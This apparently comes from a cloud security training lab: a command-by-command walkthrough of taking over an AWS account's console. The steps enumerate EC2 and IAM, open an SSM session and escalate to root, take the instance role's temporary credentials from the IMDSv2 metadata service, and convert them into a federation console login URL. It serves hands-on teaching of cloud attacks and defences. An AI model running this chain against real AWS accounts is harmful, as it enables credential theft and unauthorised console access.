## Cheat Sheet - federated_console_takeover
---

### Step 1: Initial Access and Enumeration

---

1. First, configure your AWS CLI with the provided credentials:

```bash
# Enter the provided Access Key, Secret Key, and region (us-east-1)
aws configure --profile
```

2. Verify your identity:

```bash
# Verifying your profile key
aws sts get-caller-identity --profile
```

3. Enumerate EC2 instances to locate potential public targets:

```bash
aws ec2 describe-instances --profile
```

4. Identify IAM instance profiles attached to EC2 instances:

```bash
aws ec2 describe-instances --query "Reservations[].Instances[].IamInstanceProfile.Arn" --profile
```

5. List available IAM roles to identify potential high-privilege roles:

```bash
# List all roles
aws iam list-roles

# Query only roles that contain the profile instance
aws iam list-roles --query "Roles[?contains(RoleName, 'cg-ec2-admin')].[RoleName]" --profile
```

### Step 2: EC2 Access via SSM Session Manager

---

1. Install SSM Session Manager Plugin on your local. This step is required to access the EC2 through SSM Session Manager:

```bash
# Debian install
curl "https://s3.amazonaws.com/session-manager-downloads/plugin/latest/ubuntu_64bit/session-manager-plugin.deb" -o "session-manager-plugin.deb"

# Install Command
sudo dpkg -i session-manager-plugin.deb
```

### Step 3: IMDSv2 Exploitation

---

1. Access the EC2 instance using SSM Session Manager:

```bash
aws ssm start-session --target i-<instance_id> --profile
```

2. Identity User (You should be logged in as ssm-user):

```bash
# Identify user
whoami
```

3. Switch to root user:

```bash
# Switch user
sudo -i

# Identify user
whoami
```

4. Generate an IMDSv2 token: You can perform this step to do further CLI enumeration with elevated privileges otherwise you can skip to Step 4 to generate management console URL.

```bash
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
```

5. Use the token to retrieve the IAM role name:

```bash
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

6. Retrieve the temporary credentials for the IAM role:

```bash
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/<role_name>
```

7. Configure the AWS CLI with the retrieved temporary credentials:

```bash
# Configure a new AWS CLI profile using the temporary credentials
aws configure --profile

# Add the session token manually (AWS CLI v2 does not prompt for it)
aws configure set aws_session_token <Token from the metadata output> --profile
```

8. Verify your identity:

```bash
# Verifying your profile key
aws sts get-caller-identity --profile
```

### Step 4: Federation URL Generation

---

1. Request a metadata token for IMDSv2 (required to access EC2 instance metadata securely):

```bash
TOKEN=$(curl -sX PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
```

2. Retrieve the IAM role name attached to the EC2 instance using the metadata token:

```bash
ROLE_NAME=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/)
```

3. Retrieve temporary security credentials for the IAM role:

```bash
CREDS=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME)
```

4. Build the session JSON object required for AWS federation login:

```bash
SESSION_JSON=$(jq -n \
--arg sid "$(echo "$CREDS" | jq -r '.AccessKeyId')" \
--arg skey "$(echo "$CREDS" | jq -r '.SecretAccessKey')" \
--arg stoken "$(echo "$CREDS" | jq -r '.Token')" \
'{sessionId: $sid, sessionKey: $skey, sessionToken: $stoken}')
```

5. URL-encode the temporary session JSON for use in the federation URL:

```bash
SESSION_URL_ENCODED=$(python3 -c "import urllib.parse, sys; print(urllib.parse.quote(sys.stdin.read()))" <<< "$SESSION_JSON")
```

6. Request a SignIn token using the encoded session:

```bash
SIGNIN_TOKEN=$(curl -s "https://signin.aws.amazon.com/federation?Action=getSigninToken&Session=$SESSION_URL_ENCODED" | jq -r '.SigninToken')
```

7. Generate the AWS Management Console login URL using the SignIn token:

```bash
LOGIN_URL="https://signin.aws.amazon.com/federation?Action=login&Issuer=cli-script&Destination=https://console.aws.amazon.com/&SigninToken=$SIGNIN_TOKEN"
```

8. Echo Sign in URL

```bash
echo "$LOGIN_URL"
```